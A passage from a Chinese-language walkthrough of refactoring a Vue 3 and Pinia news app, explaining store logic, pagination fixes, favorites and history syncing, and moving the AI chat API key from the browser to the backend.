async logout() {
  try {
    if (this.token) {
      await http.post('/api/user/logout')      // ← 通知服务端失效令牌
    }
  } catch (error) {
    // 退出登录失败不影响本地清理
  }
  this.userInfo = null
  this.token = ''
  this.isLogin = false
  localStorage.removeItem('user-token')
},
```

**注意 catch 里什么都不做（只有注释）。** 这是刻意的：
服务端删令牌失败（比如网络断了），用户仍然应该能退出登录。
本地状态清理放在 `finally` 的位置（try/catch 之后无条件执行）。

> 改造前没有调用后端，只清了 localStorage ——
> 服务端令牌依然有效，属于安全隐患。

### 主题 store：`src/store/theme.js`

```javascript
export const useThemeStore = defineStore('theme', {
  state: () => ({
    currentTheme: localStorage.getItem('theme') || 'light',
    themes: {
      light: { name: '浅色模式', backgroundColor: '#ffffff', textColor: '#333333', primaryColor: '#1989fa', secondaryColor: '#f5f5f5' },
      dark:  { name: '深色模式', backgroundColor: '#121212', textColor: '#ffffff', primaryColor: '#4c8bf5', secondaryColor: '#2d2d2d' },
      blue:  { name: '蓝色主题', backgroundColor: '#e6f7ff', textColor: '#333333', primaryColor: '#1890ff', secondaryColor: '#bae7ff' },
      green: { name: '绿色主题', backgroundColor: '#f6ffed', textColor: '#333333', primaryColor: '#52c41a', secondaryColor: '#d9f7be' },
    }
  }),

  getters: {
    getAllThemes: (state) => Object.keys(state.themes).map(key => ({
      id: key, name: state.themes[key].name, primaryColor: state.themes[key].primaryColor
    }))
  },

  actions: {
    setTheme(themeName) {
      if (this.themes[themeName]) {
        this.currentTheme = themeName
        localStorage.setItem('theme', themeName)
        this.applyTheme()
      }
    },

    applyTheme() {
      const theme = this.themes[this.currentTheme]
      document.documentElement.style.setProperty('--background-color', theme.backgroundColor)
      document.documentElement.style.setProperty('--text-color', theme.textColor)
      document.documentElement.style.setProperty('--primary-color', theme.primaryColor)
      document.documentElement.style.setProperty('--secondary-color', theme.secondaryColor)
    },

    initTheme() {
      this.applyTheme()
    }
  }
})
```

`applyTheme()` 的核心是 `document.documentElement.style.setProperty()` ——
它直接修改 `<html>` 元素上的 CSS 变量。因为所有组件都用 `var(--xxx)` 引用，
**改这 4 个变量就等于换了一整套皮肤**，不需要重新渲染任何组件。

### 语言 store：`src/store/language.js`

```javascript
export const useLanguageStore = defineStore('language', {
  state: () => ({
    currentLanguage: localStorage.getItem('language') || 'zh-CN',
  }),
  actions: {
    setLanguage(language) {
      this.currentLanguage = language
      localStorage.setItem('language', language)
    },
  },
})
```

### 新闻 store：`src/store/modules/news.js`（106 行）

#### ⚠️ 这个文件曾经是整个项目最严重的问题

改造前的文件结构是坏的：

```javascript
// ❌ 改造前的结构
actions: {
  changeCategory(categoryId) { ... },
  async getNewsDetail(id) {
    ...
  },
},                              // ← 提前闭合了 actions
  changeCategory(categoryId) {  // ← 悬空且重复定义
    ...
  },
  getCategoryName(categoryId) { ... }
}
```

`actions` 对象的花括号提前闭合，后面的内容悬在空中，
中间还夹着近 90 行被注释掉的死代码。
**这导致前端根本无法构建** —— 页面直接白屏。

现在结构恢复正常：

```javascript
export const useNewsStore = defineStore('news', {
  state: () => ({
    newsList: [],
    newsDetail: {},
    categories: [],
    currentCategory: null,
    loading: false,
    refreshing: false,
    finished: false,
    categoriesLoading: false,
  }),
  actions: { ... }
})
```

#### 获取分类

```javascript
async getCategories() {
  if (this.categoriesLoading) return          // ① 防重复请求
  this.categoriesLoading = true

  try {
    const response = await http.get('/api/news/categories')
    if (response && response.code === 200) {
      this.categories = response.data || []
      if (!this.currentCategory && this.categories.length > 0) {
        this.currentCategory = this.categories[0].id      // ② 默认选第一个
      }
    }
  } catch (error) {
    console.error('获取新闻分类失败:', error)
    // ③ 兜底分类，保证界面不会空白
    this.categories = [
      { id: 1, name: '头条' }, { id: 2, name: '社会' }, ...
    ]
    if (!this.currentCategory) {
      this.currentCategory = this.categories[0].id
    }
  } finally {
    this.categoriesLoading = false
  }
},
```

**① 防重复请求**：`loading` 标志位。如果用户快速点了两次，
第二次会直接返回，避免发出两个相同请求。

**③ 兜底数据**：接口挂了页面会空白，用户以为是 App 坏了。
给一份默认分类，至少界面是完整的（虽然点进去没数据）。

#### 切换分类

```javascript
changeCategory(categoryId) {
  if (this.currentCategory === categoryId) return    // 同分类不重复请求
  this.currentCategory = categoryId
  this.newsList = []          // 清空列表
  this.finished = false       // 重置"没有更多"标记
  this.getNewsList(true)      // 重新拉第一页
},
```

**为什么必须清空 `newsList`？** 否则新分类的数据会追加到旧分类的数据后面，
出现"头条新闻里混着体育新闻"的情况。

#### 列表分页

```javascript
async getNewsList(isRefresh = false) {
  if (this.finished && !isRefresh) return       // ① 没有更多了就不再请求

  if (isRefresh) {
    this.refreshing = true
    this.newsList = []
    this.finished = false
  }

  this.loading = true

  try {
    const params = {
      categoryId: this.currentCategory,
      // ② 下拉刷新永远取第 1 页；加载更多按已有条数推算下一页
      page: isRefresh ? 1 : Math.floor(this.newsList.length / 10) + 1,
      pageSize: 10,
    }

    const response = await http.get('/api/news/list', { params })

    if (response && response.code === 200) {
      const data = response.data || {}
      const newsData = data.list || []

      // ③ 刷新则替换，加载更多则追加
      this.newsList = isRefresh ? newsData : [...this.newsList, ...newsData]

      // ④ 后端直接给出是否还有更多，比前端靠条数猜更准确
      this.finished = !data.hasMore
    } else {
      this.finished = true
    }
  } catch (error) {
    console.error('获取新闻列表失败:', error)
    this.finished = true        // ⑤ 失败也要结束加载状态，避免一直转圈
  } finally {
    this.loading = false
    this.refreshing = false
  }
},
```

**② 页码计算修正**（改造点）：

```javascript
Math.ceil(this.newsList.length / 10) + 1      // ❌ 改造前
Math.floor(this.newsList.length / 10) + 1     // ✅ 改造后
```

举例说明差别：

| 已有条数 | `ceil` 结果 | `floor` 结果 | 应该取哪页 |
|---|---|---|---|
| 0 | — | — | 1 |
| 10 | `ceil(1)+1 = 2` | `floor(1)+1 = 2` | 2 ✅ |
| 15 | `ceil(1.5)+1 = 3` | `floor(1.5)+1 = 2` | 2 ✅ |
| 20 | `ceil(2)+1 = 3` | `floor(2)+1 = 3` | 3 ✅ |

已有 15 条时（第一页 10 条 + 第二页只返回了 5 条，说明到底了），
`ceil` 会算成第 3 页 —— **中间那 5 条是重复的**。
`floor` 才是正确的。

**④ 用后端的 `hasMore` 而不是自己判断**（改造点）：

```javascript
// ❌ 改造前：靠"本页条数 < pageSize"猜测
if (newsData.length < params.pageSize) {
  this.finished = true
}
```

猜不准的场景：如果最后一页恰好是 10 条整，
`10 < 10` 为假，前端以为还有更多，于是再请求一次，
拿到空数组才停下 —— 用户会看到列表"闪一下"。

后端返回的 `hasMore = (page-1)*page_size + len < total`
是基于真实总数的准确判断，直接用就好。

#### 获取详情

```javascript
async getNewsDetail(id) {
  try {
    const response = await http.get('/api/news/detail', { params: { id } })
    if (response && response.code === 200) {
      this.newsDetail = response.data
      return { success: true, data: response.data }
    }
    this.newsDetail = {}
    return { success: false, message: response?.message || '获取新闻详情失败' }
  } catch (error) {
    console.error('获取新闻详情失败:', error)
    this.newsDetail = {}
    return { success: false, message: error.friendlyMessage || '获取新闻详情失败' }
  }
},
```

**返回 `{ success, data }` 而不是直接写 state。**
这样调用方（NewsDetail.vue）可以 `await` 后立刻判断是否成功，
再决定要不要记录浏览历史。

---

## 第 6 步：登录注册流程

### `src/views/Login.vue`

```vue
<template>
  <div class="login-page">
    <van-nav-bar title="用户登录" left-arrow @click-left="onClickLeft" fixed />

    <div class="login-container">
      <div class="login-logo">
        <van-image width="80" height="80" src="https://fastly.jsdelivr.net/npm/@vant/assets/cat.jpeg" round />
        <h2>新闻资讯</h2>
      </div>

      <van-form @submit="onSubmit" class="login-form">
        <van-cell-group inset>
          <van-field v-model="username" name="username" label="用户名" placeholder="请输入用户名"
            :rules="[{ required: true, message: '请填写用户名' }]" />
          <van-field v-model="password" type="password" name="password" label="密码" placeholder="请输入密码"
            :rules="[{ required: true, message: '请填写密码' }]" />
        </van-cell-group>

        <div class="submit-btn">
          <van-button round block type="primary" native-type="submit" size="large">登录</van-button>
        </div>
      </van-form>
    </div>
  </div>
</template>
```

**`<van-form @submit="onSubmit">` 的工作机制：**

Vant 的 Form 组件接管了表单校验。当用户点击 `native-type="submit"` 的按钮时：

```
① Form 收集所有 <van-field> 的值
② 逐个执行 :rules 里的校验规则
③ 有任一不通过 → 显示错误提示，阻止提交
④ 全部通过 → 触发 @submit 事件，把表单数据作为参数传出去
```

`:rules="[{ required: true, message: '请填写用户名' }]"` ——
`required: true` 表示必填，不满足时显示 `message`。

注意 `@submit="onSubmit"` 里的 `onSubmit` 收到的参数是**表单数据对象**，
但下面的代码用的是 `username.value` 而不是 `values.username` ：

```javascript
const onSubmit = async (values) => {
  showToast({
    type: 'loading',
    message: '登录中...',
    forbidClick: true,      // ← 加载期间禁止点击（防止重复提交）
    duration: 0             // ← 0 表示不自动关闭，要手动关
  })

  try {
    const result = await userStore.login({
      username: username.value,
      password: password.value
    })

    if (result.success) {
      showToast({ type: 'success', message: result.message })
      router.push('/')
    } else {
      showToast({ type: 'fail', message: result.message })
    }
  } catch (error) {
    showToast({ type: 'fail', message: '登录失败，请稍后再试' })
  }
}
```

`duration: 0` + `forbidClick: true` 是**加载态提示的标准搭配**：
转圈提示一直显示、期间不能点击，直到请求结束。

> ⚠️ 这里有个小问题：`duration: 0` 的 loading toast 在请求结束后**没有被关闭**。
> 正常应该保存 toast 实例再调用 `.close()`，或者用 Vant 4 的
> `showLoadingToast()`（它返回实例）。
> 因为后面的 `showToast({type:'success'})` 会覆盖掉 loading toast，
> 实际表现正常，所以本次未改动。属于可优化项。

### `src/views/Register.vue` 的确认密码校验

```vue
<van-field
  v-model="confirmPassword"
  type="password"
  name="confirmPassword"
  label="确认密码"
  placeholder="请再次输入密码"
  :rules="[
    { required: true, message: '请确认密码' },
    { validator: validatePassword, message: '两次密码不一致' }
  ]"
/>
```

```javascript
const validatePassword = () => {
  return password.value === confirmPassword.value
}
```

`validator` 允许传**自定义校验函数**。返回 `true` 通过，`false` 则显示 `message`。

这里必须用 `validator` 而不是内置规则，因为规则是"两个字段相等"，
属于跨字段校验，内置规则做不到。

---

## 第 7 步：首页与新闻列表

### `src/views/Home.vue`（175 行）

#### ⚠️ 这个文件也曾有一个致命 bug

```javascript
// ❌ 改造前
const handleTabClick = (index) => {
  // 如果不是点击"更多"选项，则关闭下拉菜单
  if (displayCategories.value[index].name !== '更多') {
    showDropdown.value = false        // ← showDropdown 从未定义！
    ...
  }
}
```

`showDropdown` 在整个文件里都没有定义过。只要用户点击分类标签，
就会抛出 `ReferenceError: showDropdown is not defined`，**首页直接崩溃**。

而且这个下拉菜单的模板（`.dropdown-menu`）本身也不存在，
说明这是一段残留的死代码 —— 菜单被删了，函数忘了删。

现在删除了这两个函数，改用 Vant Tabs 自带的 `@change` 事件：

```vue
<van-tabs v-model:active="activeTab" sticky swipeable animated @change="onTabChange">
  <van-tab v-for="category in displayCategories" :key="category.id"
           :title="getCategoryTranslation(category.name)">
    ...
  </van-tab>
</van-tabs>
```

```javascript
// 标签切换：分类列表为空时直接返回，避免越界报错
const onTabChange = (index) => {
  const category = displayCategories.value[index]
  if (!category) return          // ← 越界保护
  newsStore.changeCategory(category.id)
}
```

**越界保护为什么必要？** `activeTab` 的初始值是 `0`，
但分类数据是异步加载的。如果在这个 watcher 触发时
`displayCategories` 还是空数组，`[0]` 就是 `undefined`，
再读 `.id` 又会抛错。加一行判断即可。

#### 计算属性：过滤"更多"分类

```javascript
const displayCategories = computed(() => {
  return newsStore.categories.filter((category) => category.name !== '更多')
})
```

**为什么要把"更多"过滤掉？**

因为"更多"不是一个真实分类，而是一个**跳转入口**。
它在首页右上角有独立的按钮：

```vue
<div class="more-options">
  <div class="more-tab" @click="goToCategory">
    {{ $t('home.more') }} <van-icon name="arrow" />
  </div>
</div>
```

如果不过滤，标签栏里会多出一个"更多"标签，点击后没有对应的新闻列表。

#### 分类名称的国际化映射

```javascript
const getCategoryTranslation = (categoryName) => {
  const categoryMap = {
    头条: 'headline', 社会: 'society', 国内: 'domestic', 国际: 'international',
    娱乐: 'entertainment', 体育: 'sports', 军事: 'military',
    科技: 'technology', 财经: 'finance', 更多: 'more',
  }
  const key = categoryMap[categoryName]
  return key ? t(`home.categories.${key}`) : categoryName
}
```

**为什么需要这个映射？** 因为数据库里存的是中文分类名（"头条"），
而语言包里的 key 是英文（`headline`）。翻译时需要先转换：

```
数据库 "头条"
   ↓ categoryMap 映射
   "headline"
   ↓ t(`home.categories.headline`)
中文环境 → "头条"     （zh-CN.js: headline: '头条'）
英文环境 → "Headlines"（en-US.js: headline: 'Headlines'）
```

如果映射失败（新增了数据库分类但忘了加映射），
`key` 是 `undefined`，走 `: categoryName` 直接显示原文 —— 优雅降级。

#### 生命周期：一个重复的 onMounted

```javascript
// ❌ 改造前有两个 onMounted
onMounted(() => {
  newsStore.getCategories().then(() => {
    newsStore.getNewsList()      // 第 1 次请求列表
  })
  setTimeout(updateTabsPosition, 300)
  window.addEventListener('scroll', handleScroll)     // 第 1 次添加监听
})

onMounted(() => {
  newsStore.getNewsList()        // ← 第 2 次请求列表！重复了
  setTimeout(updateTabsPosition, 300)
  window.addEventListener('scroll', handleScroll)     // ← 第 2 次添加监听！
})
```

**Vue 允许注册多个 `onMounted`**，它们都会执行。所以这里的问题是：
1. `getNewsList()` 被调用了两次 → **重复请求，列表数据可能重复**
2. `addEventListener('scroll', ...)` 被添加了两次 → 滚动时处理函数执行两次

现在合并成一个：

```javascript
onMounted(async () => {
  // 先拿到分类再拉列表，否则 currentCategory 还是空的
  await newsStore.getCategories()

  // 支持 /home?categoryId=x 直接定位到某个分类
  const queryCategoryId = parseInt(route.query.categoryId, 10)
  if (!Number.isNaN(queryCategoryId)) {
    const index = displayCategories.value.findIndex((cat) => cat.id === queryCategoryId)
    if (index !== -1) {
      activeTab.value = index
      newsStore.currentCategory = queryCategoryId
    }
  }

  await newsStore.getNewsList(true)

  setTimeout(updateTabsPosition, 300)
  window.addEventListener('scroll', handleScroll)
})

onBeforeUnmount(() => {
  window.removeEventListener('scroll', handleScroll)   // ← 必须成对清理
})
```

**`await getCategories()` 的顺序为什么重要？**
因为 `getNewsList()` 要用 `currentCategory` 拼请求参数。
如果不等分类加载完就请求，`currentCategory` 还是 `null`，请求会失败。

#### 滚动监听与"更多"按钮的定位

```javascript
const tabsTop = ref(0)      // ← 改造前没初始化，导致 top: undefinedpx

const updateTabsPosition = () => {
  const tabsElement = document.querySelector('.van-tabs__wrap')
  if (tabsElement) {
    // getBoundingClientRect().top = 元素相对视口顶部的距离
    tabsTop.value = tabsElement.getBoundingClientRect().top
  }
}

const handleScroll = () => {
  updateTabsPosition()
}
```

```css
.more-options {
  position: fixed;
  right: 0;
  /* 通过计算属性动态设置top */
  top: v-bind('tabsTop + "px"');
  height: 44px;   /* 与van-tabs__wrap高度一致 */
  ...
}
```

**`v-bind()` 用在 CSS 里是 Vue 3 的特性**，叫"CSS 变量绑定"。
它把 JS 变量的值注入到样式中。这里的作用是：
"更多"按钮固定在屏幕右侧，垂直位置**动态跟随分类标签栏**。

用户滚动页面时 `tabsTop` 变化，"更多"按钮跟着移动，始终与标签栏对齐。

#### 上拉加载与下拉刷新

```vue
<van-pull-refresh v-model="newsStore.refreshing" @refresh="onRefresh">
  <van-list
    v-model:loading="newsStore.loading"
    :finished="newsStore.finished"
    :finished-text="$t('home.noMore')"
    @load="onLoad"
  >
    <news-item v-for="item in newsStore.newsList" :key="item.id" :news="item" />
  </van-list>
</van-pull-refresh>
```

```javascript
const onRefresh = () => { newsStore.getNewsList(true) }   // 下拉刷新：isRefresh=true
const onLoad    = () => { newsStore.getNewsList() }       // 上拉加载：isRefresh=false
```

**这两个组件是配套使用的：**

| 组件 | 触发条件 | 对应 store 参数 |
|---|---|---|
| `van-pull-refresh` | 用户下拉 | `getNewsList(true)` → 清空重取第 1 页 |
| `van-list` | 滚动到底部 | `getNewsList(false)` → 追加下一页 |

**`v-model:loading` 为什么直接绑定 store 的字段？**

```vue
v-model:loading="newsStore.loading"
```

这样 `van-list` 就能：
- **读取** `loading` → 决定要不要显示转圈
- **写入** `loading` → 加载完成时自动置为 `false`

而 store 里的 `getNewsList` 也在 `finally` 里写 `this.loading = false`。
两者配合，加载状态始终准确。

### `src/components/NewsItem.vue`

```vue
<template>
  <div class="news-item" @click="goToDetail">
    <div class="news-content">
      <h3 class="news-title">{{ news.title }}</h3>
      <p class="news-desc">{{ news.description }}</p>
      <div class="news-info">
        <span>{{ news.author }}</span>
        <span>{{ news.publishTime }}</span>
        <span>{{ news.views }} 阅读</span>
      </div>
    </div>
    <div class="news-image">
      <img :src="news.image" :alt="news.title">
    </div>
  </div>
</template>

<script setup>
import { defineProps } from 'vue'
import { useRouter } from 'vue-router'

const props = defineProps({
  news: { type: Object, required: true }
})

const router = useRouter()

const goToDetail = () => {
  router.push(`/news/detail/${props.news.id}`)
}
</script>
```

**注意模板里的字段名：**

```
{{ news.publishTime }}    ← 驼峰！
{{ news.description }}
```

这正好对应后端最后确定下来的 **camelCase 契约**。

> 这也是改造前"新闻时间显示空白"的原因：
> 后端当时返回的是 `publish_time`（下划线），前端读 `publishTime` 自然拿不到。
> 修复后端序列化之后，这里无需改动就正常了。

**`defineProps` 定义组件接口**：
父组件用 `:news="item"` 传入数据，子组件通过 `props.news` 使用。
组件本身不关心数据从哪来 —— 这就是**展示型组件**（dumb component）的写法。

---

## 第 8 步：新闻详情页

### `src/views/NewsDetail.vue`（245 行）

#### 正文按段落渲染

```javascript
const contentParagraphs = computed(() => {
  if (!newsStore.newsDetail.content) return []
  return newsStore.newsDetail.content.split('\n\n').filter(p => p.trim())
})
```

```vue
<div class="content">
  <p v-for="(paragraph, index) in contentParagraphs" :key="index">
    {{ paragraph }}
  </p>
</div>
```

**为什么按 `\n\n` 拆分？**

HTML 里连续的空格和换行会被折叠成一个空格。
如果直接 `{{ content }}`，整篇新闻会变成一大坨没有分段文字，完全没法读。

用空行（`\n\n`）作为段落分隔符，拆成数组后用 `v-for` 渲染成多个 `<p>`，
浏览器就会正确地分段显示。

`.filter(p => p.trim())` 去掉空段落（连续多个空行会产生空字符串）。

#### 收藏按钮

```vue
<div class="title-container">
  <h1 class="title">{{ newsStore.newsDetail.title }}</h1>
  <van-button
    class="favorite-btn"
    :icon="isFavorite ? 'star' : 'star-o'"
    :class="{ 'is-favorite': isFavorite }"
    @click="toggleFavorite"
  />
</div>
```

```javascript
const isFavorite = computed(() => {
  return favoriteStore.isFavorite(newsId.value)
})
```

```javascript
// favorite store 里的 getter
isFavorite: (state) => (id) => state.favorites.some((item) => item.id === id),
```

**这是一个"返回函数的 getter"** —— 调用方式是 `isFavorite(45)` 而不是 `isFavorite`。
Pinia 支持这种写法，用于"带参数的查询"。等价于：

```javascript
const isFavorite = (id) => favorites.some(item => item.id === id)
```

`state.favorites.some(...)` 检查收藏列表里有没有这一条，
所以 `:icon` 会在实心星（`star`）和空心星（`star-o`）之间切换。

#### 未登录时的处理

```javascript
const toggleFavorite = async () => {
  if (!userStore.getLoginStatus) {
    showToast({ message: '请先登录后再收藏', position: 'bottom' })
    router.push('/login')
    return          // ← 关键：直接返回，不执行后面的收藏逻辑
  }

  const status = await favoriteStore.toggleFavorite(newsStore.newsDetail)

  if (status === true) {
    showToast({ message: '已添加到收藏', position: 'bottom' })
  } else if (status === false) {
    showToast({ message: '已取消收藏', position: 'bottom' })
  } else {
    // status为null表示操作失败
    showToast({ message: '操作失败，请稍后重试', position: 'bottom' })
  }
}
```

`toggleFavorite` 的返回值设计很清晰：

| 返回 | 含义 |
|---|---|
| `true` | 收藏成功 |
| `false` | 取消收藏成功 |
| `null` | 操作失败 |

**为什么用三种返回值而不是抛异常？** 因为三种情况都需要给用户不同提示，
用返回值一次 `if/else` 就能覆盖。如果用异常，失败要 try/catch，
成功要判断具体是加了还是取消了，反而更绕。

#### 记录浏览历史

```javascript
onMounted(async () => {
  await newsStore.getNewsDetail(newsId.value)

  // 添加到浏览历史
  if (newsStore.newsDetail.id) {
    if (userStore.getLoginStatus) {
      try {
        const result = await historyStore.addHistoryApi(newsStore.newsDetail.id)
        console.log('记录浏览历史API结果:', result)
      } catch (error) {
        console.error('记录浏览历史API失败:', error)
      }
    }
  }

  // 加载收藏数据
  favoriteStore.loadFavorites()

  // 检查文章收藏状态
  if (userStore.getLoginStatus && newsStore.newsDetail.id) {
    const result = await favoriteStore.checkFavoriteStatusApi(newsStore.newsDetail.id)
    if (result.success && !result.isLocal) {
      if (result.isFavorite && !favoriteStore.isFavorite(newsStore.newsDetail.id)) {
        favoriteStore.addFavorite(newsStore.newsDetail)
      } else if (!result.isFavorite && favoriteStore.isFavorite(newsStore.newsDetail.id)) {
        favoriteStore.removeFavorite(newsStore.newsDetail.id)
      }
    }
  }
})
```

**这段逻辑在做什么？** 打开详情页时并行做三件事：

```
① 拉取新闻详情             → 渲染页面
② 如果已登录，记录浏览历史   → 服务端保存（失败也不影响页面）
③ 如果已登录，查收藏状态     → 然后用服务端结果"校正"本地状态
```

**③ 的"校正"逻辑为什么需要？**

因为收藏状态有两个来源：
- 本地 `localStorage`（可能过期，比如在别的设备上取消过收藏）
- 服务端（权威）

如果服务端说"没收藏"但本地有，说明本地数据过期了，要删掉：

```javascript
} else if (!result.isFavorite && favoriteStore.isFavorite(id)) {
  favoriteStore.removeFavorite(id)     // 本地有但服务端没有 → 删掉本地
}
```

**注意 `!result.isLocal` 这个条件。** 未登录或接口失败时，
`checkFavoriteStatusApi` 会返回 `isLocal: true`（表示"这是我猜的，不是服务端的答案"）。
这种情况下不能用来校正，否则会把用户本地的收藏误删。

#### 相关推荐

```vue
<div class="related-news" v-if="newsStore.newsDetail.relatedNews?.length">
  <h3>相关推荐</h3>
  <div class="related-list">
    <div class="related-item" v-for="item in newsStore.newsDetail.relatedNews"
         :key="item.id" @click="goToRelatedNews(item.id)">
      <div class="related-image"><img :src="item.image" :alt="item.title"></div>
      <div class="related-title">{{ item.title }}</div>
    </div>
  </div>
</div>
```

```javascript
const goToRelatedNews = (id) => {
  router.push(`/news/detail/${id}`)
}
```

**`?.length` 可选链**：如果 `relatedNews` 是 `undefined`（数据还没加载完），
`undefined?.length` 返回 `undefined`，`v-if` 判定为假，不渲染这个区块。
避免了"数据没到时报 cannot read length of undefined"。

点相关推荐会跳转到**同一个路由**（只是 id 不同）。
这正是前面说的"组件复用"场景 —— 但因为 `keepAlive: false`，
组件会重新创建，不会出现旧数据残留。

---

## 第 9 步：收藏与浏览历史

### 收藏 store：`src/store/modules/favorite.js`（183 行）

#### 数据归一化

```javascript
// 把后端返回的收藏记录统一成页面需要的字段
const normalize = (item) => ({
  ...item,
  // 页面展示用的是 favoriteTime，后端返回的别名也是 favoriteTime，
  // 这里做一次兜底，兼容旧缓存或本地数据
  favoriteTime: item.favoriteTime || item.favorite_time || '',
})
```

`...item` 展开原对象，然后覆盖 `favoriteTime` 字段。
这样后端无论返回哪种格式（驼峰或下划线），页面拿到的都是统一的 `favoriteTime`。

**在 store 层做归一化而不是在页面里做**，好处是：
所有使用这份数据的地方（Favorite.vue、NewsDetail.vue）都自动受益。

#### 收藏状态查询的降级

```javascript
async checkFavoriteStatusApi(newsId) {
  const userStore = useUserStore()

  if (!userStore.getLoginStatus) {
    return { success: true, isFavorite: this.isFavorite(newsId), isLocal: true }
    //             ↑ success 为 true，但 isLocal 标记这是"本地推测"
  }

  try {
    const response = await http.get('/api/favorite/check', { params: { newsId } })
    if (response && response.code === 200) {
      return { success: true, isFavorite: response.data.isFavorite }
      //                                     ↑ 没有 isLocal，表示这是服务端权威答案
    }
    return { success: false, message: response?.message || '获取收藏状态失败' }
  } catch (error) {
    console.error('检查收藏状态请求失败:', error)
    // 接口异常时回退到本地状态，保证按钮可用
    return { success: true, isFavorite: this.isFavorite(newsId), isLocal: true }
  }
}
```

**`isLocal` 这个标记是设计的关键。** 三种情况的语义完全不同：

| 场景 | `success` | `isLocal` | 含义 |
|---|---|---|---|
| 未登录 | true | true | 用本地数据猜的 |
| 接口成功 | true | undefined | 服务端权威答案 |
| 接口失败 | true | true | 降级用本地数据 |

调用方通过 `isLocal` 判断能不能拿这个结果去"校正本地数据"
（参看 NewsDetail.vue 里那段逻辑）。

**接口失败时为什么返回 `success: true` 而不是 false？**
因为收藏按钮需要显示正确的图标。如果返回 false，
页面就不知道该显示实心星还是空心星了。用本地数据兜底，
至少按钮状态是"大概率正确"的。

#### 切换收藏的完整流程

```javascript
async toggleFavorite(news) {
  if (!news || !news.id) {
    console.error('无效的新闻对象:', news)
    return null              // 防御性编程：入参校验
  }

  if (this.isFavorite(news.id)) {
    // 取消收藏
    const result = await this.removeFavoriteApi(news.id)
    if (result.success) {
      this.removeFavorite(news.id)     // ① 先确认 API 成功
      return false
    }
    return null
  }

  // 添加收藏
  const result = await this.addFavoriteApi(news.id)
  if (result.success) {
    this.addFavorite(news)             // ① 先确认 API 成功
    return true
  }
  return null
}
```

**注意 `①` 的顺序：先调 API，成功了才更新本地。**

这是**乐观更新 vs 悲观更新**的经典选择：

| | 乐观更新 | 悲观更新（本项目用的） |
|---|---|---|
| 做法 | 先改本地，再发请求 | 先发请求，成功才改本地 |
| 优点 | 响应快，无等待感 | 数据一定准确 |
| 缺点 | 请求失败要回滚，逻辑复杂 | 有短暂延迟 |

对于收藏这种低频操作，数据准确性更重要（用户不想看到"已收藏"但实际没收藏上），
所以选悲观更新。

### 页面：`src/views/Favorite.vue`

```javascript
onMounted(async () => {
  try {
    const result = await favoriteStore.getFavoriteListApi()
    if (!result || !result.success) {
      console.log('从本地存储加载收藏列表')
    }
  } catch (error) {
    favoriteStore.loadFavorites()
  }
})
```

```javascript
// 跳转到新闻详情
const goToNewsDetail = (id) => {
  router.push(`/news/detail/${id}`)
}

// 删除单条收藏
const removeFavorite = async (id) => {
  const result = await favoriteStore.removeFavoriteApi(id)
  if (result.success) {
    favoriteStore.removeFavorite(id)
  }
}

// 确认删除
const confirmDelete = (id) => {
  showDialog({
    title: '提示',
    message: '确定要删除这条收藏吗？',
    showCancelButton: true,
  }).then((action) => {
    if (action === 'confirm') {
      removeFavorite(id)
    }
  })
}
```

**`showDialog` 的返回值机制**（Vant 4）：

```javascript
showDialog({ showCancelButton: true })
  .then((action) => {
    // action === 'confirm'  → 用户点了确定
    // action === 'cancel'   → 用户点了取消
    // 用户点了遮罩层         → reject（走 .catch）
  })
```

**危险操作用确认弹窗是必要的交互规范**。删除收藏、清空历史
这类不可撤销的操作，误触会让用户很恼火。

### 页面：`src/views/History.vue`

结构与 Favorite.vue 高度相似，区别在于：

```javascript
const onClickClear = async () => {
  showDialog({ title: '提示', message: '确定要清空所有浏览历史吗？', showCancelButton: true })
    .then(async (action) => {
      if (action === 'confirm') {
        try {
          const result = await historyStore.clearHistoryApi()
          if (!result.success && !result.isLocal) {
            showDialog({ title: '提示', message: result.message || '清空失败，请稍后重试' })
          }
        } catch (error) {
          console.error('清空历史记录失败:', error)
        }
      }
    })
}
```

历史 store 里的 `isLocal` 语义和收藏一样：未登录时会操作本地数据，
这种"成功"不需要提示，因为是预期行为。

### 时间字段的归一化（history store）

```javascript
// 把后端返回的浏览记录统一成页面需要的字段
const normalize = (item) => ({
  ...item,
  // 页面展示用的是 viewTime，后端返回的是 historyView，这里统一一下
  viewTime: item.historyView || item.viewTime || '',
})
```

这是改造时发现的一个字段不匹配问题：

```vue
<!-- History.vue 模板里写的是 -->
<span>浏览时间: {{ item.viewTime }}</span>
```

但后端返回的是 `historyView`。不做归一化的话，
**浏览时间那一栏永远是空白**。

> 对比一下：收藏页模板里写的是 `item.favoriteTime`，
> 而后端返回的正好也是 `favoriteTime`（alias 定义对了）。
> 历史页是早期遗留的不一致，用 `normalize` 统一处理。

---

## 第 10 步：AI 对话页（核心）

### 改造前的问题

```javascript
// ❌ 改造前：浏览器直连阿里云，密钥在前端
const response = await fetch('https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${apiKey.value}`,     // ← 密钥来自前端配置文件
    'X-DashScope-SSE': 'enable'
  },
  body: JSON.stringify({
    model: model.value,
    messages: allMessages,
    stream: true
  })
})
```

三个问题：
1. **密钥暴露**（最严重）
2. **后端辛苦写的 `/api/AIchat/chat/stream` 完全没被使用**
3. 解析逻辑同时兼容 DashScope 三种返回格式，属于无用分支

### 改造后：`src/views/AIChat.vue`（335 行）

> ✅ **UI 说明：本次改造只重写了 `<script setup>` 和模板中的动态文案绑定，
> 模板结构、CSS 类名、样式**全部保持原样**，页面外观与分布无任何变化。**

#### 启动时探测 AI 可用性

```javascript
onMounted(async () => {
  try {
    const response = await fetch(aiChatConfig.configEndpoint)
    if (response.ok) {
      const body = await response.json()
      // 后端未配置密钥时提前提示，省得用户白打一段字
      aiReady.value = body?.data?.enabled !== false
    }
  } catch (error) {
    // 后端没启动等情况：不阻塞界面，发消息时再报错
    console.warn('无法获取 AI 配置:', error)
  }
  scrollToBottom()
})
```

**为什么要这一步？** 用户体验考量：

| | 没有探测 | 有探测 |
|---|---|---|
| 后端没配密钥 | 用户认真打了一段问题 → 点击发送 → 报错 | 发送时立刻提示"AI 服务未配置" |
| 判断时机 | 打字之后 | 打字之前/发送瞬间 |

`body?.data?.enabled !== false` 这个写法是"**默认为可用**"：
只有明确收到 `enabled: false` 才认为不可用。
如果接口异常、字段缺失，都当作可用（让用户试，失败了再看具体错误）。

#### 发送消息：完整的生命周期管理

```javascript
const sendMessage = async () => {
  if (!userInput.value.trim() || isLoading.value) return

  if (!aiReady.value) {
    showToast('AI 服务未配置，请在服务端 .env 中设置 DEEPSEEK_API_KEY')
    return
  }

  // ① 添加用户消息
